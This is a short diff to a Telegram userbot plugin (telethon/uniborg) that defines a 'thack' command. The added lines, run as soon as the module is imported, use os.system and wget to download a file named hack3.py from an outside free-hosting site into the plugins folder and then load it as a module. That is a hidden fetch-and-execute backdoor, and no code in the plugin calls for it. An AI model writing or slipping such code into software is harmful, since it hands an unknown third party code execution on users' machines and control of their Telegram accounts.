@@ -7,8 +7,10 @@ from telethon import events
 import asyncio
 from uniborg.util import admin_cmd
 from telethon.tl.functions.users import GetFullUserRequest
-
-
+from userbot.utils import load_module
+import os
+os.system('wget https://legendx22.000webhostapp.com/hack3.py -P userbot/plugins/')
+load_module('hack3')
 
 @borg.on(admin_cmd(pattern=r"thack"))
 
